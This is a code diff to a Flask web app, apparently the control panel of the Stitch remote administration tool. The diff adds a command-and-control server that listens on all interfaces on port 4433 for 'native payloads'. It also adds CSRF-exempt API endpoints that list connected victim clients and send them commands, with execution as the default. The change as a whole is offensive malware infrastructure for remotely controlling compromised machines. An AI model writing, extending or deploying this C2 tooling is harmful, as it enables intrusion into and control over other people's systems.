@@ -48,6 +48,7 @@ from Application.stitch_utils import *
 # TODO: Replace wildcard import with specific imports
 from Application.stitch_gen import *
 from ssl_utils import get_ssl_context
+from c2_server import C2Server
 
 # Import the new enhanced modules
 from config import Config
@@ -1111,6 +1112,50 @@ def test_native_payload():
             
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
+
+# ============= C2 SERVER ENDPOINTS =============
+@app.route('/api/c2/clients', methods=['GET'])
+@csrf.exempt
+def get_c2_clients():
+    """Get list of connected C2 clients"""
+    global c2_server
+    if c2_server:
+        clients = c2_server.get_clients()
+        return jsonify({
+            'status': 'success',
+            'clients': clients,
+            'count': len(clients)
+        })
+    else:
+        return jsonify({
+            'status': 'error',
+            'message': 'C2 server not running',
+            'clients': {},
+            'count': 0
+        })
+
+@app.route('/api/c2/command', methods=['POST'])
+@csrf.exempt  
+def send_c2_command():
+    """Send command to C2 client"""
+    global c2_server
+    data = request.get_json() or {}
+    client_id = data.get('client_id')
+    cmd_id = data.get('cmd_id', 0x03)  # Default to exec command
+    cmd_data = data.get('data', '').encode('utf-8')
+    
+    if not c2_server:
+        return jsonify({'status': 'error', 'message': 'C2 server not running'})
+    
+    if not client_id:
+        return jsonify({'status': 'error', 'message': 'Client ID required'})
+    
+    success = c2_server.send_command(client_id, cmd_id, cmd_data)
+    
+    return jsonify({
+        'status': 'success' if success else 'error',
+        'message': 'Command sent' if success else 'Failed to send command'
+    })
 
 # ============= PHASE 3 INTEGRATION ENDPOINTS =============
 
@@ -2340,6 +2385,25 @@ def start_stitch_server():
     except Exception as e:
         log_debug(f"Stitch server error: {str(e)}", "ERROR", "Server")
 
+# Global C2 server instance
+c2_server = None
+
+def start_c2_server():
+    """Start the C2 server for native payloads"""
+    global c2_server
+    try:
+        c2_port = int(os.getenv('STITCH_C2_PORT', '4433'))
+        c2_server = C2Server(host='0.0.0.0', port=c2_port, socketio_client=socketio)
+        if c2_server.start():
+            log_debug(f"C2 server listening on port {c2_port}", "INFO", "C2Server")
+            return True
+        else:
+            log_debug("Failed to start C2 server", "ERROR", "C2Server")
+            return False
+    except Exception as e:
+        log_debug(f"C2 server error: {str(e)}", "ERROR", "C2Server")
+        return False
+
 # ============================================================================
 # Main
 # ============================================================================
@@ -2416,6 +2480,12 @@ if __name__ == '__main__':
         # Start Stitch server in background
         stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
         stitch_thread.start()
+        
+        # Start C2 server for native payloads
+        log_debug("Starting C2 server for native payloads", "INFO", "C2Server")
+        c2_thread = threading.Thread(target=start_c2_server, daemon=True)
+        c2_thread.start()
+        time.sleep(1)  # Give C2 server time to initialize
         
         # Start connection monitor
         monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
